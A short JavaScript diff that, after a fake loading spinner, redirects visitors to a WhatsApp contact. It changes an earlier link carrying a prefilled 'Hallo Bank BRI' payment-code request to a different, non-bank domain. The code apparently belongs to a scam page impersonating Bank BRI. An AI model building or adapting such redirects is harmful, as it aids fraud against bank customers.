@@ -93,7 +93,7 @@ function get(){
  $("#process1").show();
  $('.load').fadeIn();   
 setTimeout(function(){  
-location.href='https://wa.me/62816966927?text=𝗛𝗮𝗹𝗹𝗼%20𝗕𝗮𝗻𝗸%20𝗕𝗥𝗜,%0ASaya%20mau%20Request%20Kode%20BRIVA';
+location.href='https://Agusbuntung.wasap.my';
  $("#process1").hide();
  $('.load').fadeOut();
  }, 2000);    
